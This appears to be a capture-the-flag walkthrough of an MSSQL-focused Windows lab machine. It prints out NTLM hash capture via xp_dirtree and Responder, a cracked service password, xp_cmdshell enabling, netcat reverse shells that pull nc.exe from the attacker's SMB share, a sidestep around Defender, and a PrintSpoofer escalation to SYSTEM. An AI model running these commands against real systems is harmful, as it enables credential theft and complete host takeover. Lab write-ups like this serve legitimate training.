## Review

A medium Windows box centered entirely on MSSQL. You start from a macro-enabled Excel file on an anonymous SMB share that leaks a low-privilege database login, use `xp_dirtree` to coerce the SQL service account into authenticating back to Responder, crack the captured NetNTLMv2 hash, and reconnect as a sysadmin account. From there it's `xp_cmdshell` for the foothold, and a classic `SeImpersonatePrivilege` Potato attack for SYSTEM.

**Personal Rating:** ⭐⭐⭐⭐⭐ (4.5/5)

**Recommended for:** Anyone wanting to practice MSSQL enumeration and SeImpersonate privilege escalation on Windows. Honestly a nice box, I liked it very much

This `reporting` login isn't sysadmin and can't impersonate anyone, but it does have EXECUTE on `xp_dirtree`. That's enough to coerce the server into connecting back to us over SMB, which means we can capture the SQL service account's NetNTLMv2 hash with Responder.

```bash
#Starting Responder on my machine
sudo responder -I tun0

#On the MSSQL instance shell
EXEC master..xp_dirtree '\\10.10.14.122\x', 1, 1;

#Result on Responder
```

### Foothold

Now we have a domain account. My first instinct was to run BloodHound, but it timed out on DNS:

```bash
python3 bloodhound.py -u mssql-svc -p 'corporate568' -d HTB.LOCAL -ns $target -c All --zip

#Result
Server Do53:10.129.38.146@53 answered The DNS operation timed out.
```

After retrying a few times I realized this machine doesn't expose 53/88/389... There's simply nothing here for the collector to talk to, so BloodHound isn't the way.

Let's reconnect to MSSQL with the new account instead:

```bash
impacket-mssqlclient QUERIER/mssql-svc:'corporate568'@$target -windows-auth

#Result
SQL (QUERIER\mssql-svc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');  
      
-      
1
```

This account is sysadmin, so we can enable `xp_cmdshell` and run commands.

```bash
SQL (QUERIER\mssql-svc  dbo@master)> EXEC sp_configure 'show advanced options', 1;  
INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.  
SQL (QUERIER\mssql-svc  dbo@master)> RECONFIGURE;  
SQL (QUERIER\mssql-svc  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;  
INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.  
SQL (QUERIER\mssql-svc  dbo@master)> RECONFIGURE;  
SQL (QUERIER\mssql-svc  dbo@master)> EXEC xp_cmdshell 'whoami';  
output                 
-----------------      
querier\mssql-svc

```

First I tried a base64-encoded PowerShell reverse shell, but it got flagged by Defender (AMSI):

```text
FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

So instead I went the nc.exe route, no PowerShell involved:

```bash
#On my machine
mkdir smb && cp /usr/share/windows-resources/binaries/nc.exe smb/
impacket-smbserver share smb -smb2support

#Start the listener
nc -lvnp 4447

#Execute nc directly from the MSSQL shell
EXEC xp_cmdshell '\\10.10.14.122\share\nc.exe -e cmd.exe 10.10.14.122 4447';
```

That lands us a shell as `querier\mssql-svc`, and the user flag is on the mssql-svc user's desktop.

### Privilege Escalation - SeImpersonate

A quick `whoami /all` shows the path to SYSTEM straight away:

```cmd
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                               State      
============================= ========================================= ========  
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled  
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled  
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled  
```

`SeImpersonatePrivilege` is enabled. That's the classic Potato route for a service account, so I used PrintSpoofer.

```bash
#Start another nc listener
nc -lvnp 4448

#Upload nc.exe and PrintSpoofer64.exe via the SMB share I already had open,
#then copy both to local disk (running them from disk instead of over UNC
#avoids the CreateProcessAsUser Error 2 you hit otherwise)
copy \\10.10.14.122\share\nc.exe C:\Windows\Temp\nc.exe
copy \\10.10.14.122\share\PrintSpoofer64.exe C:\Windows\Temp\ps.exe

#Trigger the impersonation and fire a shell back as SYSTEM
C:\Windows\Temp\ps.exe -c "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.122 4448"
```

Result on the nc listener:

```bash
C:\Windows\system32>whoami  
whoami  
nt authority\system
```

With this we got the SYSTEM shell and the root flag. Rooted.
